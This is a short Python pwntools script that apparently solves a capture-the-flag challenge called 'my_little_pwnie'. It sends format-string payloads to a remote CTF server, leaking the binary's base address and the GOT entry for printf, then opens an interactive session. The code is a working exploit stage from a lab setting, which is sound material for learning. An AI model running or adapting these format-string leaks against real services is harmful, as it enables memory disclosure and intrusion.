#!/usr/bin/env python3

from pwn import *

exe = ELF("./my_little_pwnie")

context.binary = exe

remotely = True

def conn():
        remotely = False
        return process([exe.path])


#r = conn()
r = remote("pwnie.zajebistyc.tf", 17003)

def main():
    
    payload = "%67$p"
    r.sendline(payload)
    b_base = int(r.recvline().strip(), 16) - 0x4a0
    log.warn("probably base @ 0x%x", b_base)
    
    payload = b"%7$s".ljust(8, b"M")
    payload += p64(b_base + exe.got["printf"])
    r.sendline(payload)
    
    leak = u64(r.recvuntil("\x7f").ljust(8, p8(0)))
    log.warn("Leak @ 0x%x", leak)

    r.interactive()


if __name__ == "__main__":
    main()
